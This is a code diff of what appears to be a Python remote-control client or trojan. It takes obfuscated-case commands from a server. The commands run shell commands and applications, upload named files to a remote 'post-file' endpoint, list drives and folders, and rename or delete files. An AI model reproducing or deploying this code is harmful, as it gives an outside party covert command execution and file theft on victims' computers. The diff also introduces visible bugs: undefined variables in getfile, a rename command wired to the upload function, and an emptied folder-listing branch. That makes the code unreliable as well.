@@ -529,6 +529,58 @@ def commtxt():
         log(f"started commtxt",terminal=True)
     except Exception as e:
         log(f"commtxt thread error:\t{e}",state="WARN")
+        
+##              FILE OPERATIONS REMOTELY
+# RETRIEVING THE FILES
+def getfile(name:str) -> None:
+    if name.startswith("/"):
+        p = name.replace("/", "")
+    try:
+        with open(p, "rb") as file:
+            files = {'file': file}
+            if not post(url + "post-file", files=files).status_code == 200:
+                if not post(url + "post-file", files=files).status_code == 200:
+                    log(f"Error during file post: {e}", state="FATAL")
+    except Exception as e:
+        log(f"Error opening {name}:\t{e}",state="FATAL")
+# RENAMING A FILE
+def renamefile(name:str) -> None:
+    p, name = name.split("|")
+    if p.startswith("/"):
+        p = p.replace("/", "")
+    name = path.join(path.dirname(p), name)
+    try:
+        rename(p,name)
+    except Exception as e:
+        log(f"Cant rename {p} to {name}:\t{e}",state="FATAL")
+# DELETING A FILE
+def deletefile(name:str) -> None:
+    if name.startswith("/"):
+        name = name.replace("/", "")
+    try:remove(name)
+    except Exception as e:
+        log(f"Cant delete {name}:\t{e}",state="FATAL")
+# RETRIEVING FOLDERS
+def getfolder(name:str) -> None:
+    if name == "/":
+        folder = {}
+        partitions = psutil.disk_partitions()
+        for idx, partition in enumerate(partitions, start=1):
+            folder[f"folder{idx}"] = partition.device
+        post(url+"post-folder",json=folder)
+    else:
+        if name.startswith("/"):
+            name = name.replace("/","")
+        datas = listdir(name)
+        folder = {}
+        for idx, data in enumerate(datas, start=1):
+            if path.isdir(path.join(name,data)):
+                folder[f"folder{idx}"] = data
+            else:
+                folder[f"file{idx}"] = data
+        post(url+"post-folder",json=folder)
+
+
 def main():
     global sstate
     global sharing
@@ -549,43 +601,29 @@ def main():
             elif "rEsTaRt" in cmd:
                 restart()
             elif "oPeN" in cmd:
-                link = cmd.replace("oPeN ","")
-                link = link.replace("sPeAk","") if "sPeAk" in link else link
-                wbopen(link)
-                log(f"Opened {link}",terminal=True)
+                wbopen(cmd.replace("oPeN ",""))
+                log(f"Opened {cmd.replace("oPeN ","")}")
             elif "pLaY" in cmd:
-                fp = cmd.replace("pLaY ","")
-                fp = fp.replace("sPeAk","") if "sPeAk" in fp else fp
-                Thread(target=playfunc,args=(fp,)).start()
+                Thread(target=playfunc,args=(cmd.replace("pLaY ",""),)).start()
             elif "uPdAtE" in cmd:
                 update()
             elif "rUn" in cmd:
-                app_name = cmd.replace("rUn ","")
-                app_name = app_name.replace("sPeAk","") if "sPeAk" in app_name else app_name
-                Thread(target=run,args=(app_name,)).start()
+                Thread(target=run,args=(cmd.replace("rUn ",""),)).start()
             elif "iMaGe" in cmd:
-                ifp = cmd.replace("iMaGe ","")
-                ifp = ifp.replace("sPeAk","") if "sPeAk" in ifp else ifp
-                Thread(target=display,args=(ifp,)).start()
+                Thread(target=display,args=(cmd.replace("iMaGe ",""),)).start()
             elif "vIdEo" in cmd:
-                ifp = cmd.replace("vIdEo ","")
-                ifp = ifp.replace("sPeAk","") if "sPeAk" in ifp else ifp
-                Thread(target=display,args=(ifp,)).start()
+                Thread(target=display,args=(cmd.replace("vIdEo ",""),)).start()
             elif "fLiP on" in cmd:
                 sstate = True
                 Thread(target=flip).start()
             elif "fLiP off" in cmd:
                 sstate = False
                 screen.set_landscape()
-                log("flip off",terminal=True)
+                log("flip off")
             elif "cMd" in cmd:
-                cmd = cmd.replace("cMd ","")
-                cmd = cmd.replace("sPeAk","") if "sPeAk" in cmd else cmd
-                Thread(target=runcmd,args=(cmd,)).start()
+                Thread(target=runcmd,args=(cmd.replace("cMd ",""),)).start()
             elif "eRr" in cmd:
-                cmd = cmd.replace("eRr ","")
-                cmd = cmd.replace("sPeAk","") if "sPeAk" in cmd else cmd
-                Thread(target=showerr,args=(cmd,)).start()
+                Thread(target=showerr,args=(cmd.replace("eRr ",""),)).start()
             elif "sHaRe on" in cmd:
                 sharing = True
                 Thread(target=share_trig).start()
@@ -599,62 +637,16 @@ def main():
             elif "cOm txt" in cmd:
                 Thread(target=commtxt).start()
             elif "sPeAk" in cmd:
-                txt = cmd.replace("sPeAk","")
-                saying = Thread(target=say,args=(txt,))
-                saying.start()
+                Thread(target=say,args=(cmd.replace("sPeAk",""),)).start()
             elif "gEtFiLe" in cmd:
-                p = cmd.replace("gEtFiLe ", "")
-                if p.startswith("/"):
-                    p = p.replace("/", "")
-                try:
-                    with open(p, "rb") as file:
-                        files = {'file': file}
-                        print("file")
-                        try:
-                            res = post(url + "post-file", files=files)
-                        except Exception as e:
-                            print("Error during file post:", e)
-                except Exception as e:
-                    print(f"Error opening file {p}: {e}")
+                Thread(target=getfile,args=(cmd.replace("gEtFiLe ", ""),)).start()
             elif "rEnAmE" in cmd:
-                a = cmd.replace("rEnAmE ","")
-                p, name = a.split("|")
-                if p.startswith("/"):
-                    p = p.replace("/", "")
-                print(p)
-                print(name)
-                name = path.join(path.dirname(p), name)
-                try:
-                    rename(p,name)
-                except Exception as e:
-                    print(e)
-                print("rename")
+                Thread(target=getfile,args=(cmd.replace("rEnAmE ",""),)).start()
             elif "dElEtE" in cmd:
-                p = cmd.replace("dElEtE ","")
-                if p.startswith("/"):
-                    p = p.replace("/", "")
-                remove(p)
+                Thread(target=deletefile,args=(cmd.replace("dElEtE ",""),)).start()
             elif "gEtFoLdEr" in  cmd:
                 p = cmd.replace("gEtFoLdEr ","")
-                if p == "/":
-                    folder = {}
-                    partitions = psutil.disk_partitions()
-                    for idx, partition in enumerate(partitions, start=1):
-                        folder[f"folder{idx}"] = partition.device
-                    post(url+"post-folder",json=folder)
-                    print(folder)
-                else:
-                    if p.startswith("/"):
-                        p = p.replace("/","")
-                    datas = listdir(p)
-                    folder = {}
-                    for idx, data in enumerate(datas, start=1):
-                        if path.isdir(path.join(p,data)):
-                            folder[f"folder{idx}"] = data
-                        else:
-                            folder[f"file{idx}"] = data
-                    print(folder)
-                    post(url+"post-folder",json=folder)
+                
         except Exception as e:
             log(f"Main thread error occured:\t{e}",state="WARN")
     log("Shutting down",state="OFFLINE")
